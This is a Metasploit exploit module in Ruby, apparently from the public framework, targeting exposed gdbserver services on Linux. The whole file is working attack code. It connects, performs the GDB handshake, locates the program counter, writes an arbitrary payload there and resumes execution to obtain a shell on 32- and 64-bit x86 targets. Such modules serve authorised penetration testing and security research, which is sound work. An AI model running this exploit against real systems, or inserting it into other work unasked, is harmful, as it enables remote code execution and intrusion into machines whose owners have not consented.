##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Gdb

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'GDB Server Remote Payload Execution',
      'Description'   => %q{
          This module attempts to execute an arbitrary payload on a gdbserver service.
      },
      'Author'        => [ 'joev' ],
      'Targets'       => [
        [ 'x86 (32-bit)',    { 'Arch' => ARCH_X86 } ],
        [ 'x86_64 (64-bit)', { 'Arch' => ARCH_X86_64 } ]
      ],
      'Arch'          => [ ARCH_X86, ARCH_X86_64 ],
      'Platform'      => %w(linux),
      'DefaultTarget' => 0
    ))
  end

  def exploit
    connect

    print_status "Performing handshake with gdbserver..."
    handshake

    print_status "Stepping program to find PC..."
    gdb_pc, gdb_arch = process_info.values_at :pc, :arch

    unless arch.include? gdb_arch
      fail_with('The payload architecture is incorrect.')
    end

    print_status "Writing payload at #{gdb_pc}..."
    write(payload.encoded, gdb_pc)

    print_status "Executing the payload..."
    continue

    # gdb throws a SIGINT on the execve, so a second continue is necessary
    continue(read: false) # don't wait on response, as the shell is now looping

    handler
    disconnect
  end

end
